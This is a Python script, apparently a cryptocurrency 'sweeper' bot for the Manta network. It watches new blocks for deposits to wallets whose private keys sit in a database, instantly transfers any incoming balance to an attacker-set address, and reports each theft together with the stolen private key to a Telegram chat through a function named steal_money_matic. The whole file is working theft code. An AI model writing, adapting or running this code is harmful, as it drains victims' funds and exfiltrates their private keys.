from web3 import Web3
import time
from web3.middleware import geth_poa_middleware
import database as db
from config import send_address, manta_grab, manta_vhod, YOUR_CHAT_ID, TELEGRAM_BOT_TOKEN

import telegram
from telegram import Bot

bot = Bot(token=TELEGRAM_BOT_TOKEN)

web3 = Web3(Web3.HTTPProvider(manta_vhod))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)
blocks_matic = []

def start_vivod():
    """Main function to initiate withdrawal"""
    getblocks_matic()

def getblocks_matic():
    """Fetch new blocks"""
    while True:
        latestBlock = web3.eth.get_block(block_identifier=web3.eth.defaultBlock, full_transactions=True)
        if str(latestBlock.number) in blocks_matic:
            pass
        else:
            trans_matic = latestBlock.transactions
            print(f'Last Block! {str(latestBlock.number)} | MANTA')
            trans_wallets_matic(trans_matic)
            blocks_matic.append(str(latestBlock.number))
        time.sleep(0.5)

def trans_wallets_matic(trans_matic):
    """Process transactions and extract 'to' addresses"""
    for x in trans_matic:
        try:
            to_address_split = x['to']
            to_address = to_address_split.split('\n')
            for address in to_address:
                res = db.search_vivod(address)
                if res == False:
                    pass
                else:
                    steal_money_matic(address)
        except:
            pass

def steal_money_matic(address):
    """Withdraw funds on the Polygon network"""
    try:
        balance = web3.eth.get_balance(address)
        gwei = web3.eth.gas_price + 100000000


        wallet_key = db.get_info_address(address)
        grab_from_matic_balance = web3.toWei(manta_grab, 'ether')

        counter = 0
        while True:
            if balance < grab_from_matic_balance:
                counter = counter + 1
                if counter == 200:
                    return
                time.sleep(0.1)
            else:
                break
        nonce = web3.eth.get_transaction_count(address)

        gas = int(gwei) * 22000
        amount = balance - web3.toWei(0.0001, 'ether') - gas
        tx_price = {
            'chainId': 169,
            'nonce': nonce,
            'to': send_address,
            'value': amount,
            'gas': 22000,
            'gasPrice': int(gwei)
        }
        signed_tx = web3.eth.account.sign_transaction(tx_price, wallet_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        hash_xd = web3.toHex(tx_hash)
        amount_ether = web3.fromWei(amount, "ether")
        success_message = f' ✅  SUCCESSFUL WITHDRAWAL OF MANTA  ✅ \n \n HASH: {hash_xd}   \n \n 💰 AMOUNT: {amount_ether} 💰  \n \n ADDRESS: {address} \n \n PRIVATE: {wallet_key}'
        print(success_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=success_message)
    except Exception as e:
        error_message = f'MANTA | UNSUCCESSFUL WITHDRAWAL | ADDRESS: {address} | MISTAKE: {e}'
        print(error_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=error_message)

if __name__ == "__main__":
    start_vivod()
